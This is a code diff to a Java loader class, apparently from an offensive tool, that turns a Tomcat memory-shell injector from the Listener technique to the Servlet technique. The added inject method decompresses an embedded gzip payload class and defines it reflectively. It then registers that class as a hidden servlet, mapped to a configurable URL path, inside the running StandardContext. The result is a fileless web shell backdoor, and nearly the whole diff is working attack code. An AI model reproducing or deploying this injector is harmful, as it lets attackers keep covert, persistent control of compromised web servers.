@@ -11,6 +11,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
+import java.util.HashMap;
 import java.util.List;
 import java.util.zip.GZIPInputStream;
 
@@ -19,13 +20,15 @@ import java.util.zip.GZIPInputStream;
  * <p>
  */
 @Middleware(Middleware.Tomcat)
-@MemShell(MemShell.Listener)
-@JavaClassModifiable({JavaClassModifiable.CLASSNAME})
-public class TomcatThreadLoader {
+@MemShell(MemShell.Servlet)
+@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH, JavaClassModifiable.NAME,})
+public class TomcatServletThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
+    private static String PATH;
+    private static String NAME;
 
-    public TomcatThreadLoader() {
+    public TomcatServletThreadLoader() {
     }
 
     static {
@@ -41,61 +44,67 @@ public class TomcatThreadLoader {
     }
 
 
-    public static void inject(Object standardContext) throws Exception {
-    }
+//    public static void inject(Object standardContext) throws Exception {
+//    }
 
     /**
-     * Listener
+     * Tomcat Servlet
      */
-//    public static void inject(Object standardContext) throws Exception {
-//        Object[] applicationEventListenersObjects = null;
-//        List applicationEventListeners;
+    public static void inject(Object standardContext) throws Exception {
+        HashMap children = (HashMap) getFieldValue(standardContext, "children");
+        if (children.containsKey(NAME)) {
+            return;
+        }
+
 //        Object object = getObject();
+        // 动态代理兼容 javax jakarta
+        Class servletClass = null;
+        try {
+            servletClass = Class.forName("jakarta.servlet.Servlet");
+        } catch (Exception e) {
+            try {
+                servletClass = Class.forName("javax.servlet.Servlet");
+            } catch (ClassNotFoundException ex) {
+
+            }
+        }
+
+        byte[] bytes = decompress(gzipObject);
+        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+        defineClass.setAccessible(true);
+        Class clazz;
+        try {
+            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
+        } catch (Exception e) {
+            clazz = classLoader.loadClass(CLASSNAME);
+        }
+        Object javaObject = clazz.newInstance();
+        Object object = Proxy.newProxyInstance(servletClass.getClassLoader(), new Class[]{servletClass}, (InvocationHandler) javaObject);
+
+
+
+        Object standardWrapper = Class.forName("org.apache.catalina.core.StandardWrapper").newInstance();
+        invokeMethod(standardWrapper.getClass().getSuperclass(), standardWrapper, "setName", new Class[]{String.class}, new Object[]{NAME});
+        invokeMethod(standardWrapper.getClass(), standardWrapper, "setServletClass", new Class[]{String.class}, new Object[]{CLASSNAME});
+        invokeMethod(standardWrapper.getClass(), standardWrapper, "setServlet", new Class[]{servletClass}, new Object[]{object});
+
+
+        invokeMethod(standardContext.getClass(), standardContext, "addChild", new Class[]{Class.forName("org.apache.catalina.Container")}, new Object[]{standardWrapper});
+
+        // 缩短
+        invokeMethod(standardContext.getClass(), standardContext, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{PATH, NAME});
 //        try {
-//            applicationEventListeners = (List) getFieldValue(standardContext, "applicationEventListenersList");
-//            for (int i = 0; i < applicationEventListeners.size(); i++) {
-//                if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {
-//                    return;
-//                }
-//            }
-//        } catch (Exception e) {
-//
+//            // M1 Servlet映射到URL模式
+//            invokeMethod(standardContext.getClass(), standardContext, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{PATH, NAME});
+//        } catch (NoSuchMethodException e) {
+//            // M2 Servlet3 新特性 Dynamic
+//            Class<?> cls = Class.forName("org.apache.catalina.core.ApplicationServletRegistration");
+//            Object applicationServletRegistration = cls.getConstructor(Class.forName("org.apache.catalina.Wrapper"), Class.forName("org.apache.catalina.Context")).newInstance(standardWrapper, standardContext);
+//            invokeMethod(Class.forName("javax.servlet.ServletRegistration"), applicationServletRegistration, "addMapping", new Class[]{String[].class}, new Object[]{new String[]{PATH}});
 //        }
-//
-//        try {
-//            applicationEventListenersObjects = (Object[]) getFieldValue(standardContext, "applicationEventListenersObjects");
-//            for (int i = 0; i < applicationEventListenersObjects.length; i++) {
-//                Object applicationEventListenersObject = applicationEventListenersObjects[i];
-//                if (applicationEventListenersObject instanceof Proxy && object instanceof Proxy) {
-//                    Object h = getFieldValue(applicationEventListenersObject, "h");
-//                    Object h2 = getFieldValue(object, "h");
-//                    if (h.getClass().getName().contains(h2.getClass().getName())) {
-//                        return;
-//                    }
-//                } else {
-//                    if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {
-//                        return;
-//                    }
-//                }
-//            }
-//        } catch (Exception e) {
-//
-//        }
-//
-//        if (applicationEventListenersObjects != null) {
-//            // 5 6
-//            Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];
-//            System.arraycopy(applicationEventListenersObjects, 0, newApplicationEventListenersObjects, 0, applicationEventListenersObjects.length);
-//            newApplicationEventListenersObjects[newApplicationEventListenersObjects.length - 1] = object;
-//            setFieldValue(standardContext, "applicationEventListenersObjects", newApplicationEventListenersObjects);
-//        } else {
-//            List applicationEventListenersList = (List) getFieldValue(standardContext, "applicationEventListenersList");
-//            applicationEventListenersList.add(object);
-//
-//            // 7 8 9 10
-////            invokeMethod(standardContext.getClass(), standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
-//        }
-//    }
+
+    }
 
     public static Object getStandardContext() throws Exception {
         Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
@@ -116,7 +125,7 @@ public class TomcatThreadLoader {
             Object this0 = getFieldValue(target, "this$0");
             Object handler = getFieldValue(this0, "handler");
             Object global = getFieldValue(handler, "global");
-            java.util.List processors = (java.util.List) getFieldValue(global, "processors");
+            List processors = (List) getFieldValue(global, "processors");
 
             for (int j = 0; j < processors.size(); j++) {
                 Object processor = processors.get(j);
@@ -140,34 +149,34 @@ public class TomcatThreadLoader {
         return null;
     }
 
-    public static Object getObject() throws Exception {
-        // 动态代理兼容 javax jakarta
-        Class servletRequestListenerClass = null;
-        try {
-            servletRequestListenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
-        } catch (Exception e) {
-            try {
-                servletRequestListenerClass = Class.forName("javax.servlet.ServletRequestListener");
-            } catch (ClassNotFoundException ex) {
-
-            }
-        }
-
-        byte[] bytes = decompress(gzipObject);
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
-        defineClass.setAccessible(true);
-        Class clazz;
-        try {
-            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
-        } catch (Exception e) {
-            clazz = classLoader.loadClass(CLASSNAME);
-        }
-        Object javaObject = clazz.newInstance();
-        Object object = Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(), new Class[]{servletRequestListenerClass}, (InvocationHandler) javaObject);
-
-        return object;
-    }
+//    public static Object getObject() throws Exception {
+//        // 动态代理兼容 javax jakarta
+//        Class servletClass = null;
+//        try {
+//            servletClass = Class.forName("jakarta.servlet.Servlet");
+//        } catch (Exception e) {
+//            try {
+//                servletClass = Class.forName("javax.servlet.Servlet");
+//            } catch (ClassNotFoundException ex) {
+//
+//            }
+//        }
+//
+//        byte[] bytes = decompress(gzipObject);
+//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+//        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+//        defineClass.setAccessible(true);
+//        Class clazz;
+//        try {
+//            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
+//        } catch (Exception e) {
+//            clazz = classLoader.loadClass(CLASSNAME);
+//        }
+//        Object javaObject = clazz.newInstance();
+//        Object object = Proxy.newProxyInstance(servletClass.getClassLoader(), new Class[]{servletClass}, (InvocationHandler) javaObject);
+//
+//        return object;
+//    }
 
 
     // tools
